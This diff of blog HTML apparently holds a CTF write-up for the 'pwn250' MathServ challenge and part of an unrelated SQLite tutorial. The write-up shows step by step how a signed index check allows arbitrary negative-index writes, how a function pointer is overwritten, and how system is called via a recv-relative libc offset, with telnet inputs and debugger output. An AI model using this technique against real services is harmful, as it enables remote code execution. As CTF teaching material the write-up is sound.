+Trying ::1...
+Trying 127.0.0.1...
+Connected to localhost.
+Escape character is &#39;^]&#39;.
+    __  ___      __  __   _____
+   /  |/  /___ _/ /_/ /_ / ___/___  ______   __ v0.01
+  / /|_/ / __ `/ __/ __ \\__ \/ _ \/ ___/ | / /
+ / /  / / /_/ / /_/ / / /__/ /  __/ /   | |/ /
+/_/  /_/\__,_/\__/_/ /_/____/\___/_/    |___/
+===============================================
+Welcome to MathServ! The one-stop shop for all your arithmetic needs.
+This program was written by a team of fresh CS graduates using only the most
+agile of spiraling waterfall development methods, so rest assured there are
+no bugs here!
+
+Your current workspace is comprised of a 10-element table initialized as:
+{ 0, 1, 2, 3, 4, 5, 6, 7, 8, 9 }
+
+Commands:
+	read	Read value from given index in table
+	write	Write value to given index in table
+	func1	Change operation to addition
+	func2	Change operation to multiplication
+	math	Perform math operation on table
+	exit	Quit and disconnect
+exit
+Exiting program!
+Connection closed by foreign host.
+$</code></pre>
+</section>
+<section id="the-vulnerability" class="level1">
+<h1>The vulnerability</h1>
+<section id="high-level" class="level4">
+<h4>High-level</h4>
 <p>The output of the program is self-explanatory. Let’s try some commands.</p>
 <pre><code>$ telnet localhost 31337
 read
@@ -923,17 +986,29 @@ Input numeric value to write:
 999
 Connection closed by foreign host.</code></pre>
 <p>Heh, we can <strong>write below</strong> our table!</p>
-<h4 id="low-level">Low-level</h4>
+</section>
+<section id="low-level" class="level4">
+<h4>Low-level</h4>
 <p>The assembly code, responsible for checking the indices can be viewed below. <img style="float:center" src='/images/ida-atoi-read.png' alt="Read - atoi"/></p>
 <p>As you can <em>not</em> see, there is no check code for the index when we’re doing a <em>read</em> operation.</p>
 <p><img style="float:center" src='/images/ida-atoi-write.png' alt="Write - atoi"/></p>
 <p>For the <em>write</em> operation there is checking using the instruction <code>jle</code>. But <code>jle</code> instruction is used for comparing <em>signed</em> integers. The instruction <code>jbe</code> should be used in this case which compares <em>unsigned</em> integers. You can find more on this <a href="http://en.wikibooks.org/wiki/X86_Assembly/Control_Flow#Jump_if_Less">wiki article</a>. Probably the original code looks something like this:</p>
-<p>{% highlight cpp %} int i; i = atoi(str); if (i &gt; 9) { error(); exit(); } do_stuff; {% endhighlight %}</p>
+<pre class="sourceCode cpp"><code class="sourceCode cpp"><span class="dt">int</span> i;
+i = atoi(str);
+<span class="kw">if</span> (i &gt; <span class="dv">9</span>) {
+	error();
+	exit();
+}
+do_stuff;</code></pre>
 <p>One way to correct the above code is to have an unsigned comparison or check for negative values. Both would work in this case, but then we couldn’t solve this level :-).</p>
 <p>In short, the <strong>index checking</strong> is <strong>broken</strong>. We can use any index for the <strong>read</strong> operation and for the <strong>write</strong> only negative indices. When you can write anything to any address of a program, the rest is just implementation.</p>
-<h1 id="the-exploit">The exploit</h1>
+</section>
+</section>
+<section id="the-exploit" class="level1">
+<h1>The exploit</h1>
 <p>As explained in the previous section we can modify <em>almost</em> any address from our vulnerable program. In order to choose a right way to exploit the vulnerability, we should gather more information about the environment.</p>
-<h3 id="do-we-have-any-rwx-place-to-store-the-payload">Do we have any RWX place to store the payload?</h3>
+<section id="do-we-have-any-rwx-place-to-store-the-payload" class="level3">
+<h3>Do we have any RWX place to store the payload?</h3>
 <pre><code>$ readelf -e ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f 
 ELF Header:
   Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 
@@ -953,20 +1028,33 @@ Program Headers:
   GNU_RELRO      0x002e68 0x0804be68 0x0804be68 0x00198 0x00198 R   0x1
 [...]</code></pre>
 <p>The short answer is <strong>no</strong> - there is no <code>RWE</code> section in the binary. We cannot modify a memory that will be executed later. Maybe we can put our exploit in some region and then make this region executable. This means that we should be able to call <code>mprotect</code> or <code>mmap</code>. But we’ll have to do this, without injecting code, but only by changing non-executable data - e.g. stack values. One idea is to use a <a href="http://en.wikipedia.org/wiki/Return-oriented_programming">return-oriented-programming (ROP) approach</a>, but as you will see in a future section, because our program doesn’t use <code>mprotect</code> or <code>mmap</code> (from libc), calling those functions means that we will have to figure out the offsets of those functions in libc first - if we do this, we can have a more straightforward approach by calling <code>system</code> function directly.</p>
-<h3 id="is-aslr-enabled">Is ASLR enabled?</h3>
+</section>
+<section id="is-aslr-enabled" class="level3">
+<h3>Is ASLR enabled?</h3>
 <p>It is safe to assume that <a href="http://en.wikipedia.org/wiki/Address_space_layout_randomization#Linux">ASLR</a> is enabled. But because we will use some sort of ROP, we don’t care too much about this right now.</p>
-<h3 id="where-shall-we-write">Where shall we write?</h3>
+</section>
+<section id="where-shall-we-write" class="level3">
+<h3>Where shall we write?</h3>
 <p>In order to modify the flow control of the program by only changing non-executable memory, we will have to find an <strong>indirect jump</strong> and change the value from that specific address. <a href="http://althing.cs.dartmouth.edu/secref/resources/plt-got.txt">GOT</a> is the starting point for this.</p>
 <p>The idea that comes to our mind is: we will write (override) an address of function which is called later from the GOT. The GOT table is always at the same place in the memory (it resides in the binary) but recall, that we’re writing relatively to a buffer (the workspace table). So the next question that comes in our mind is:</p>
-<h3 id="do-we-know-the-address-of-the-buffer">Do we know the address of the buffer?</h3>
-<p>There are three cases where the buffer might be located: * on the stack. If ASLR is enabled, figuring out its address can be done by reading an old <code>%ebp</code>, which is possible because we can read parts of the memory relative to the buffer address; * on the heap. This is harder to get. But if our buffer is on the heap, and we can alter structures that are used internally by the malloc function (and we can, because the negative offset write) there is a way of exploiting. We can do something like in the case of <a href="https://www.owasp.org/index.php/Double_Free">double-free vulnerability</a> - but it would be a tedious job; * declared global (<code>.bss</code> or <code>.data</code> section). The address of the buffer is the same as in the binary, no runtime hazards.</p>
+</section>
+<section id="do-we-know-the-address-of-the-buffer" class="level3">
+<h3>Do we know the address of the buffer?</h3>
+<p>There are three cases where the buffer might be located:</p>
+<ul>
+<li>on the stack. If ASLR is enabled, figuring out its address can be done by reading an old <code>%ebp</code>, which is possible because we can read parts of the memory relative to the buffer address;</li>
+<li>on the heap. This is harder to get. But if our buffer is on the heap, and we can alter structures that are used internally by the malloc function (and we can, because the negative offset write) there is a way of exploiting. We can do something like in the case of <a href="https://www.owasp.org/index.php/Double_Free">double-free vulnerability</a> - but it would be a tedious job;</li>
+<li>declared global (<code>.bss</code> or <code>.data</code> section). The address of the buffer is the same as in the binary, no runtime hazards.</li>
+</ul>
 <p>Probably because pwn250 is <strong>not</strong> the hardest level, the buffer is in the <code>.data</code> section.</p>
 <p><img style="float:center" src='/images/ida-values.png' alt="Values buffer"/></p>
 <p>Because our buffer is in <code>.data</code> section and we can use negative indices for read and write, we have a <strong>good</strong> control over the memory <strong>below</strong> our buffer. Moreover, you can see in the <a href="https://www.hex-rays.com/products/ida/index.shtml">IDA</a> screenshot above, that there’s a <code>math</code> variable. The program is capable of switching from one operation (addition) to another one (multiplication) it does so by changing a pointer to a function. The pointer is in the <code>.bss</code> section.</p>
 <p><img style="float:center" src='/images/ida-indirect-jump.png' alt="Indirect jump via math_ptr"/></p>
 <p>I know at this point, one might argue that the authors of the program used this pointer to facilitate the problem solving - it’s true I wouldn’t argue against this - it’s just a game.</p>
 <p>So <strong>let’s state our idea</strong>: we will override a pointer to a function which is called later; the function will be called whenever the <code>math</code> function is called.</p>
-<h2 id="first-poc">First <a href="http://en.wikipedia.org/wiki/Proof_of_concept">PoC</a></h2>
+</section>
+<section id="first-poc" class="level2">
+<h2>First <a href="http://en.wikipedia.org/wiki/Proof_of_concept">PoC</a></h2>
 <pre><code>$ telnet localhost 31337
 [...]
 math
@@ -1003,9 +1091,19 @@ Core was generated by `./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f&#39
 Program terminated with signal 11, Segmentation fault.
 #0  0x11111111 in ?? ()
 (gdb) </code></pre>
-<p>Neat! But what are those numbers? We wrote at position <strong>-2147483634</strong> value <strong>286331153</strong>. The second number is the instruction pointer at which we want to jump with the <code>math</code> function. The first number is computed as follows * the base of our buffer (values) is at a fixed address 0x804c040 * the address at which we want to write is 0x804c078 * we need to write at position values+0x38 * giving a positive index (0x38/4) will give an upper bound error * the negative index is -(2^31 - (0x38/4)) == <strong>-2147483634</strong> * you can test this by computing 2^33 + 0x804c040-4*(2^31 - (0x38/4)) - because of the way the buffer is addressed (4 bytes values, <a href="http://en.wikipedia.org/wiki/Addressing_mode#Scaled">scaled addressing</a>) the overflow is ignored and the index value <em>wraps</em> around. We need to do <em>wrap</em> around only when we try to access a value above the base address of the vector.</p>
+<p>Neat! But what are those numbers? We wrote at position <strong>-2147483634</strong> value <strong>286331153</strong>. The second number is the instruction pointer at which we want to jump with the <code>math</code> function. The first number is computed as follows</p>
+<ul>
+<li>the base of our buffer (values) is at a fixed address 0x804c040</li>
+<li>the address at which we want to write is 0x804c078</li>
+<li>we need to write at position values+0x38</li>
+<li>giving a positive index (0x38/4) will give an upper bound error</li>
+<li>the negative index is -(2^31 - (0x38/4)) == <strong>-2147483634</strong></li>
+<li>you can test this by computing 2^33 + 0x804c040-4*(2^31 - (0x38/4)) - because of the way the buffer is addressed (4 bytes values, <a href="http://en.wikipedia.org/wiki/Addressing_mode#Scaled">scaled addressing</a>) the overflow is ignored and the index value <em>wraps</em> around. We need to do <em>wrap</em> around only when we try to access a value above the base address of the vector.</li>
+</ul>
 <p>The instruction pointer is the value that we wrote, 0x11111111 in decimal is <strong>286331153</strong>, so we’ve managed to modify the flow of the program by doing a write, and we’ve managed to do so in a predictable way.</p>
-<h2 id="second-poc">Second PoC</h2>
+</section>
+<section id="second-poc" class="level2">
+<h2>Second PoC</h2>
 <p>We are in the following state: we’ve managed to make our program to jump at any location. But <strong>where</strong> to jump? Because we don’t have any possibility of injecting code, we should rely on the available code. Available code means, our code and the dynamic libraries code which are mapped in our address space.</p>
 <p>Let’s inspect again our binary to see what is used from shared libraries.</p>
 <pre><code>$ nm -D -u ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f 
@@ -1032,7 +1130,7 @@ $ readelf -s /lib/tls/i686/cmov/libc.so.6 | grep &#39; system@&#39;
 $ echo $((0x00039100-0x000cebf0))
 -613104</code></pre></li>
 </ul>
-<p>The offset is -613104, <strong>note</strong> that it depends on the version of libc, hence the exploit isn’t too reliable. Let’s focus though on exploiting locally and postpone the computation of the remote offset. We will write at the same address as in PoC1 but we will write the value of <code>system</code> function i.e. address_of_recv_function+OFFSET.</p>
+<p>The offset is -613104, <strong>note</strong> that it depends on the version of libc, hence the exploit isn’t too reliable. Let’s focus though on exploiting locally and postpone the computation of the remote offset. We will write at the same address as in PoC1 but we will write the value of <code>system</code> function i.e. <code>address_of_recv_function+OFFSET</code>.</p>
 <pre><code>$ telnet localhost 31337
 read
 Input position to read from:
@@ -1062,7 +1160,9 @@ Result of math: -1</code></pre>
 [pid  4902] brk(0)                      = 0x9a04000
 [...]</code></pre>
 <p>We successfully <strong>called execve</strong>!</p>
-<h2 id="parameters-to-execve">Parameters to execve</h2>
+</section>
+<section id="parameters-to-execve" class="level2">
+<h2>Parameters to execve</h2>
 <p>We are able to run <code>execve</code> but we don’t control the parameters … yet. Let’s see with what parameters <code>execve</code> is called.</p>
 <pre><code>$ gdb ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f
 [...]
@@ -1091,10 +1191,21 @@ ebx            0xb7fa5a5a	-1208329638
 (gdb) x/s ((char **)$ecx)[2]
 0x804c040 &lt;values&gt;:	 &quot;&quot;
 (gdb) </code></pre>
-<p>Because we’re using <code>system</code> function the first parameters are set accordingly (<code>sh -c</code>) but the actual command (<code>(char **)$ecx)[2]</code>) is empty. You can have a look at <code>execve</code> syscall <a href="http://www.kernel.org/doc/man-pages/online/pages/man2/execve.2.html">parameters</a> and the <a href="http://stackoverflow.com/questions/2535989/what-are-the-calling-conventions-for-unix-linux-system-calls-on-x86-64">calling convention</a> for it. Here we’re very <strong>lucky</strong>, the command that is passed to system is our buffer with values, the initial table. Let’s recap our approach: * get the address of <code>recv</code> function via GOT * set the pointer of <code>math</code> function to <code>system</code> by adding an offset to <code>recv</code> function address * set the parameters in the workspace table * trigger the exploit by using the <code>math</code> function * profit</p>
-<h2 id="getting-some-output">Getting some output</h2>
+<p>Because we’re using <code>system</code> function the first parameters are set accordingly (<code>sh -c</code>) but the actual command (<code>(char **)$ecx)[2]</code>) is empty. You can have a look at <code>execve</code> syscall <a href="http://www.kernel.org/doc/man-pages/online/pages/man2/execve.2.html">parameters</a> and the <a href="http://stackoverflow.com/questions/2535989/what-are-the-calling-conventions-for-unix-linux-system-calls-on-x86-64">calling convention</a> for it. Here we’re very <strong>lucky</strong>, the command that is passed to system is our buffer with values, the initial table. Let’s recap our approach:</p>
+<ul>
+<li>get the address of <code>recv</code> function via GOT</li>
+<li>set the pointer of <code>math</code> function to <code>system</code> by adding an offset to <code>recv</code> function address</li>
+<li>set the parameters in the workspace table</li>
+<li>trigger the exploit by using the <code>math</code> function</li>
+<li>profit</li>
+</ul>
+</section>
+<section id="getting-some-output" class="level2">
+<h2>Getting some output</h2>
 <p>The only problem was that the communication socket was number 4 and the output went to file descriptor 1, but running the command with <code>&gt;&amp;4 2&gt;&amp;4</code> appended, did the trick for us.</p>
-<h2 id="the-offset-the-achilles-heel-of-the-exploit">The offset, the Achilles’ Heel of the exploit</h2>
+</section>
+<section id="the-offset-the-achilles-heel-of-the-exploit" class="level2">
+<h2>The offset, the Achilles’ Heel of the exploit</h2>
 <p>Well, the exploit worked locally, but remote it didn’t.</p>
 <p>Recall that when computing the offset of <code>system</code> function in respect to <code>recv</code> function, we were able to access the libc that was used on the target <code>system</code>. A few ideas appeared:</p>
 <ul>
@@ -1102,15 +1213,19 @@ ebx            0xb7fa5a5a	-1208329638
 <li>try random values - this didn’t work at all and it was time consuming (I was already tired and my thinking was bad)</li>
 <li>get a copy of in use libc - this is a problem, because we cannot do <code>open</code>, in the best case, we might do some <code>send</code> over the socket using as buffer input the libc mapping.</li>
 <li>hope for the best, and use another challenge (which we already exploited) and download that libc file and hope that this system has the same one.</li>
-<li>try to do a more intelligent search by matching function entries (<code>push %ebp</code>, <code>mov %esp, %ebp</code> etc.), this would require too much work.</li>
+<li>try to do a more intelligent search by matching function entries (<code>push   %ebp</code>, <code>mov %esp, %ebp</code> etc.), this would require too much work.</li>
 <li>use some magical tool/table that I’m not sure it exists.</li>
 </ul>
 <p>We used a <strong>previous</strong> level and was able to <strong>download</strong> the libc, this libc was identical with the one that was in use by the current challenge, so we were able to compute the offset for the remote system.</p>
 <p>I don’t know of any method of doing a reliable return-to-libc attack without knowing the addresses of some functions. Maybe there’s a method of getting all the symbols after knowing the libc base, that would be neat.</p>
 <p>The final exploit can be found <a href="res/pwn250.py">here</a>.</p>
-<h1 id="conclusion">Conclusion</h1>
+</section>
+</section>
+<section id="conclusion" class="level1">
+<h1>Conclusion</h1>
 <p>We’ve presented a way of doing a return-to-libc attack, even though this is a primitive return-to-libc approach, we used a function from libc. We also had to compute the offset of that function using the address of another function - this makes the exploit unreliable.</p>
 <p>In the end, it boils down to have the right skill for using the right tools, it’s nothing fancy.</p>
+</section>
 
     </div>
   </div>
@@ -1216,15 +1331,23 @@ update-grub2</code></pre>
       <p>Rather than relying on dry explanations of mathematical set theory, this tutorial is organized as a survey of SQL statements and techniques. It is designed to let you infer from examples what SQL is all about as well as the kinds of problems it can help you solve.</p>
 <p>The promise of this tutorial is that you invest 30 minutes of your time and it will enable you to “speak” SQL right here, right now.</p>
 <p>The uncompromising emphasis here is on raw speed of learning new things.</p>
-<h3 id="introduction">Introduction</h3>
+<section id="introduction" class="level3">
+<h3>Introduction</h3>
 <p>SQL is the universal language that allows relational database management systems (RDBMS) to communicate with the outside world.</p>
 <p>The easiest way for a developer to become familiar with SQL is by using SQLite, a file-based (serverless) RDBMS.</p>
-<h3 id="lets-start-coding-already">Let’s start coding already!</h3>
+</section>
+<section id="lets-start-coding-already" class="level3">
+<h3>Let’s start coding already!</h3>
 <p>To check whether you already have SQLite on your GNU/Linux system, open up a terminal and run:</p>
 <pre><code>which sqlite3 &amp;&amp; echo &quot;OK - SQLite found&quot;</code></pre>
 <p>To install SQLite on Ubuntu, simply run:</p>
 <pre><code>sudo apt-get install sqlite3</code></pre>
-<p>The first few baby steps when learning SQL are: - creating a new database; - creating a new table inside that database; - populating the table with some data.</p>
+<p>The first few baby steps when learning SQL are:</p>
+<ul>
+<li>creating a new database;</li>
+<li>creating a new table inside that database;</li>
+<li>populating the table with some data.</li>
+</ul>
 <p>First, let’s create a new database. In a terminal, run:</p>
 <pre><code>sqlite3 /tmp/dev.db</code></pre>
 <p>You should see output similar to this:</p>
@@ -1236,56 +1359,110 @@ sqlite&gt;</code></pre>
 <p>You communicate your intent to SQLite by typing in SQL statements.</p>
 <p>As we already mentioned, when we start working on a new database, the first thing we do is create a table.</p>
 <p>At the <code>sqlite&gt;</code> prompt, type the following SQL statement:</p>
-<p>{% highlight sql %} CREATE TABLE presidencies ( id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, first_name VARCHAR(255), other_names VARCHAR(255), year_from INTEGER, year_to INTEGER, notes TEXT ); {% endhighlight %}</p>
+<pre class="sourceCode sql"><code class="sourceCode sql"><span class="kw">CREATE</span> <span class="kw">TABLE</span> presidencies (
+  <span class="kw">id</span> <span class="dt">INTEGER</span> <span class="kw">PRIMARY</span> <span class="kw">KEY</span> AUTOINCREMENT <span class="kw">NOT</span> <span class="kw">NULL</span>,
+  first_name <span class="dt">VARCHAR</span>(<span class="dv">255</span>),
+  other_names <span class="dt">VARCHAR</span>(<span class="dv">255</span>),
+  year_from <span class="dt">INTEGER</span>,
+  year_to <span class="dt">INTEGER</span>,
+  notes TEXT
+);</code></pre>
 <p>SQLite does not give any output in response, and that means it has successfully executed the statement.</p>
 <p>We now have an empty table called <code>presidencies</code>.</p>
 <p>Having an empty table in a database is like having an empty spreadsheet in front of you.</p>
 <p>The next step is therefore to populate the table with some data.</p>
 <p>We do this by using the <code>INSERT</code> statement. Try this:</p>
-<p>{% highlight sql %} INSERT INTO presidencies VALUES ( NULL, “Barack”, “Obama”, 2009, 2012, “Won against John McCain” ); {% endhighlight %}</p>
+<pre class="sourceCode sql"><code class="sourceCode sql"><span class="kw">INSERT</span> <span class="kw">INTO</span> presidencies <span class="kw">VALUES</span> (
+  <span class="kw">NULL</span>,
+  <span class="ot">&quot;Barack&quot;</span>,
+  <span class="ot">&quot;Obama&quot;</span>,
+  <span class="dv">2009</span>,
+  <span class="dv">2012</span>,
+  <span class="ot">&quot;Won against John McCain&quot;</span>
+);</code></pre>
 <p>Again, SQLite is not giving us any response, which means the <code>INSERT</code> statement was successfully executed.</p>
 <p>If we now query the contents of the table, we should see the newly inserted row. Try this:</p>
-<p>{% highlight sql %} SELECT * FROM presidencies; {% endhighlight %}</p>
+<pre class="sourceCode sql"><code class="sourceCode sql"><span class="kw">SELECT</span> * <span class="kw">FROM</span> presidencies;</code></pre>
 <p>The output you should see is this:</p>
 <pre><code>1|Barack|Obama|2009|2012|Won against John McCain</code></pre>
 <p>As you can probably tell, the output is in the format:</p>
 <pre><code>id|first_name|other_names|year_from|year_to|notes</code></pre>
 <p>Since we set <code>id</code> to <code>NULL</code> in our <code>INSERT</code> statement and <code>id</code> has the <code>AUTOINCREMENT</code> attribute in the table definition, SQLite assigned the first available positive integer value and stored it as this record’s primary key.</p>
-<p>“Primary key” simply means two things: - The developer has communicated his intention to use this field to uniquely identify each row of this table; - The RDBMS will therefore enforce the uniqueness of this key and use this information to optimize its execution of SQL statements against this table.</p>
+<p>“Primary key” simply means two things:</p>
+<ul>
+<li>The developer has communicated his intention to use this field to uniquely identify each row of this table;</li>
+<li>The RDBMS will therefore enforce the uniqueness of this key and use this information to optimize its execution of SQL statements against this table.</li>
+</ul>
 <p>Let’s put this behavior to the test. Try the same <code>INSERT</code> statement as before, only replace <code>NULL</code> with <code>1</code> (an already existing <code>id</code>):</p>
-<p>{% highlight sql %} INSERT INTO presidencies VALUES ( 1, “Barack”, “Obama”, 2009, 2012, “Won against John McCain” ); {% endhighlight %}</p>
+<pre class="sourceCode sql"><code class="sourceCode sql"><span class="kw">INSERT</span> <span class="kw">INTO</span> presidencies <span class="kw">VALUES</span> (
+  <span class="dv">1</span>,
+  <span class="ot">&quot;Barack&quot;</span>,
+  <span class="ot">&quot;Obama&quot;</span>,
+  <span class="dv">2009</span>,
+  <span class="dv">2012</span>,
+  <span class="ot">&quot;Won against John McCain&quot;</span>
+);</code></pre>
 <p>The output you should see is:</p>
 <pre><code>Error: PRIMARY KEY must be unique</code></pre>
 <p>To change a record in the table, we are going to use an <code>UPDATE</code> statement with a precisely targeted <code>WHERE</code> clause:</p>
-<p>{% highlight sql %} UPDATE presidencies SET notes = “His campaign slogan was yes-we-can” WHERE id = 1; {% endhighlight %}</p>
+<pre class="sourceCode sql"><code class="sourceCode sql"><span class="kw">UPDATE</span> presidencies <span class="kw">SET</span> notes = <span class="ot">&quot;His campaign slogan was yes-we-can&quot;</span> <span class="kw">WHERE</span> <span class="kw">id</span> = <span class="dv">1</span>;</code></pre>
 <p>Query the whole table again to see the changes:</p>
-<p>{% highlight sql %} SELECT * FROM presidencies; {% endhighlight %}</p>
+<pre class="sourceCode sql"><code class="sourceCode sql"><span class="kw">SELECT</span> * <span class="kw">FROM</span> presidencies;</code></pre>
 <p>The output you should see is this:</p>
 <pre><code>1|Barack|Obama|2009|2012|His campaign slogan was yes-we-can</code></pre>
 <p>To remove a record from the table, we are going to use a precisely targeted <code>DELETE</code> statement:</p>
-<p>{% highlight sql %} DELETE FROM presidencies WHERE id = 1; {% endhighlight %}</p>
+<pre class="sourceCode sql"><code class="sourceCode sql"><span class="kw">DELETE</span> <span class="kw">FROM</span> presidencies <span class="kw">WHERE</span> <span class="kw">id</span> = <span class="dv">1</span>;</code></pre>
 <p>Query the whole table again to verify that it’s empty.</p>
 <p>To continue exploring the features of SQL we are going to need a lot more data.</p>
 <p>Paste the statements below at the <code>sqlite&gt;</code> prompt:</p>
-<p>{% highlight sql %} INSERT INTO presidencies VALUES (NULL, “Theodore”, “Roosevelt”, 1905, 1908, “”); INSERT INTO presidencies VALUES (NULL, “William”, “Taft”, 1909, 1912, “”); INSERT INTO presidencies VALUES (NULL, “Woodrow”, “Wilson”, 1913, 1916, “1st term; WW 1 begins”); INSERT INTO presidencies VALUES (NULL, “Woodrow”, “Wilson”, 1917, 1920, “2nd term; WW 1 ends”); INSERT INTO presidencies VALUES (NULL, “Warren”, “Harding”, 1921, 1922, “”); INSERT INTO presidencies VALUES (NULL, “Calvin”, “Coolidge”, 1923, 1924, “1st term”); INSERT INTO presidencies VALUES (NULL, “Calvin”, “Coolidge”, 1925, 1928, “2nd term”); INSERT INTO presidencies VALUES (NULL, “Herbert”, “Hoover”, 1929, 1932, “”); INSERT INTO presidencies VALUES (NULL, “Franklin”, “D. Roosevelt”, 1933, 1936, “1st term”); INSERT INTO presidencies VALUES (NULL, “Franklin”, “D. Roosevelt”, 1937, 1940, “2nd term; WW 2 begins”); INSERT INTO presidencies VALUES (NULL, “Franklin”, “D. Roosevelt”, 1941, 1944, “3rd term”); INSERT INTO presidencies VALUES (NULL, “Harry”, “Truman”, 1945, 1948, “1st term; WW 2 ends”); INSERT INTO presidencies VALUES (NULL, “Harry”, “Truman”, 1949, 1952, “2nd term”); INSERT INTO presidencies VALUES (NULL, “Dwight”, “Eisenhower”, 1953, 1956, “1st term”); INSERT INTO presidencies VALUES (NULL, “Dwight”, “Eisenhower”, 1957, 1960, “2nd term”); INSERT INTO presidencies VALUES (NULL, “John”, “F. Kennedy”, 1961, 1963, “”); INSERT INTO presidencies VALUES (NULL, “Lyndon”, “Johnson”, 1964, 1964, “Took over when JFK was assassinated”); INSERT INTO presidencies VALUES (NULL, “Lyndon”, “Johnson”, 1965, 1968, “2nd term”); INSERT INTO presidencies VALUES (NULL, “Richard”, “Nixon”, 1969, 1972, “1st term”); INSERT INTO presidencies VALUES (NULL, “Richard”, “Nixon”, 1973, 1974, “2nd term”); INSERT INTO presidencies VALUES (NULL, “Gerald”, “Ford”, 1975, 1976, “”); INSERT INTO presidencies VALUES (NULL, “Jimmy”, “Carter”, 1977, 1980, “”); INSERT INTO presidencies VALUES (NULL, “Ronald”, “Reagan”, 1981, 1984, “1st term”); INSERT INTO presidencies VALUES (NULL, “Ronald”, “Reagan”, 1985, 1988, “2nd term”); INSERT INTO presidencies VALUES (NULL, “George”, “H. W. Bush”, 1989, 1992, “”); INSERT INTO presidencies VALUES (NULL, “Bill”, “Clinton”, 1993, 1996, “1st term”); INSERT INTO presidencies VALUES (NULL, “Bill”, “Clinton”, 1997, 2000, “2nd term”); INSERT INTO presidencies VALUES (NULL, “George”, “W. Bush”, 2001, 2004, “1st term”); INSERT INTO presidencies VALUES (NULL, “George”, “W. Bush”, 2005, 2008, “2nd term”); INSERT INTO presidencies VALUES (NULL, “Barack”, “Obama”, 2009, 2012, “”); {% endhighlight %}</p>
+<pre class="sourceCode sql"><code class="sourceCode sql"><span class="kw">INSERT</span> <span class="kw">INTO</span> presidencies <span class="kw">VALUES</span> (<span class="kw">NULL</span>, <span class="ot">&quot;Theodore&quot;</span>, <span class="ot">&quot;Roosevelt&quot;</span>, <span class="dv">1905</span>, <span class="dv">1908</span>, <span class="ot">&quot;&quot;</span>);
+<span class="kw">INSERT</span> <span class="kw">INTO</span> presidencies <span class="kw">VALUES</span> (<span class="kw">NULL</span>, <span class="ot">&quot;William&quot;</span>, <span class="ot">&quot;Taft&quot;</span>, <span class="dv">1909</span>, <span class="dv">1912</span>, <span class="ot">&quot;&quot;</span>);
+<span class="kw">INSERT</span> <span class="kw">INTO</span> presidencies <span class="kw">VALUES</span> (<span class="kw">NULL</span>, <span class="ot">&quot;Woodrow&quot;</span>, <span class="ot">&quot;Wilson&quot;</span>, <span class="dv">1913</span>, <span class="dv">1916</span>, <span class="ot">&quot;1st term; WW 1 begins&quot;</span>);
+<span class="kw">INSERT</span> <span class="kw">INTO</span> presidencies <span class="kw">VALUES</span> (<span class="kw">NULL</span>, <span class="ot">&quot;Woodrow&quot;</span>, <span class="ot">&quot;Wilson&quot;</span>, <span class="dv">1917</span>, <span class="dv">1920</span>, <span class="ot">&quot;2nd term; WW 1 ends&quot;</span>);
+<span class="kw">INSERT</span> <span class="kw">INTO</span> presidencies <span class="kw">VALUES</span> (<span class="kw">NULL</span>, <span class="ot">&quot;Warren&quot;</span>, <span class="ot">&quot;Harding&quot;</span>, <span class="dv">1921</span>, <span class="dv">1922</span>, <span class="ot">&quot;&quot;</span>);
+<span class="kw">INSERT</span> <span class="kw">INTO</span> presidencies <span class="kw">VALUES</span> (<span class="kw">NULL</span>, <span class="ot">&quot;Calvin&quot;</span>, <span class="ot">&quot;Coolidge&quot;</span>, <span class="dv">1923</span>, <span class="dv">1924</span>, <span class="ot">&quot;1st term&quot;</span>);
+<span class="kw">INSERT</span> <span class="kw">INTO</span> presidencies <span class="kw">VALUES</span> (<span class="kw">NULL</span>, <span class="ot">&quot;Calvin&quot;</span>, <span class="ot">&quot;Coolidge&quot;</span>, <span class="dv">1925</span>, <span class="dv">1928</span>, <span class="ot">&quot;2nd term&quot;</span>);
+<span class="kw">INSERT</span> <span class="kw">INTO</span> presidencies <span class="kw">VALUES</span> (<span class="kw">NULL</span>, <span class="ot">&quot;Herbert&quot;</span>, <span class="ot">&quot;Hoover&quot;</span>, <span class="dv">1929</span>, <span class="dv">1932</span>, <span class="ot">&quot;&quot;</span>);
+<span class="kw">INSERT</span> <span class="kw">INTO</span> presidencies <span class="kw">VALUES</span> (<span class="kw">NULL</span>, <span class="ot">&quot;Franklin&quot;</span>, <span class="ot">&quot;D. Roosevelt&quot;</span>, <span class="dv">1933</span>, <span class="dv">1936</span>, <span class="ot">&quot;1st term&quot;</span>);
+<span class="kw">INSERT</span> <span class="kw">INTO</span> presidencies <span class="kw">VALUES</span> (<span class="kw">NULL</span>, <span class="ot">&quot;Franklin&quot;</span>, <span class="ot">&quot;D. Roosevelt&quot;</span>, <span class="dv">1937</span>, <span class="dv">1940</span>, <span class="ot">&quot;2nd term; WW 2 begins&quot;</span>);
+<span class="kw">INSERT</span> <span class="kw">INTO</span> presidencies <span class="kw">VALUES</span> (<span class="kw">NULL</span>, <span class="ot">&quot;Franklin&quot;</span>, <span class="ot">&quot;D. Roosevelt&quot;</span>, <span class="dv">1941</span>, <span class="dv">1944</span>, <span class="ot">&quot;3rd term&quot;</span>);
+<span class="kw">INSERT</span> <span class="kw">INTO</span> presidencies <span class="kw">VALUES</span> (<span class="kw">NULL</span>, <span class="ot">&quot;Harry&quot;</span>, <span class="ot">&quot;Truman&quot;</span>, <span class="dv">1945</span>, <span class="dv">1948</span>, <span class="ot">&quot;1st term; WW 2 ends&quot;</span>);
+<span class="kw">INSERT</span> <span class="kw">INTO</span> presidencies <span class="kw">VALUES</span> (<span class="kw">NULL</span>, <span class="ot">&quot;Harry&quot;</span>, <span class="ot">&quot;Truman&quot;</span>, <span class="dv">1949</span>, <span class="dv">1952</span>, <span class="ot">&quot;2nd term&quot;</span>);
+<span class="kw">INSERT</span> <span class="kw">INTO</span> presidencies <span class="kw">VALUES</span> (<span class="kw">NULL</span>, <span class="ot">&quot;Dwight&quot;</span>, <span class="ot">&quot;Eisenhower&quot;</span>, <span class="dv">1953</span>, <span class="dv">1956</span>, <span class="ot">&quot;1st term&quot;</span>);
+<span class="kw">INSERT</span> <span class="kw">INTO</span> presidencies <span class="kw">VALUES</span> (<span class="kw">NULL</span>, <span class="ot">&quot;Dwight&quot;</span>, <span class="ot">&quot;Eisenhower&quot;</span>, <span class="dv">1957</span>, <span class="dv">1960</span>, <span class="ot">&quot;2nd term&quot;</span>);
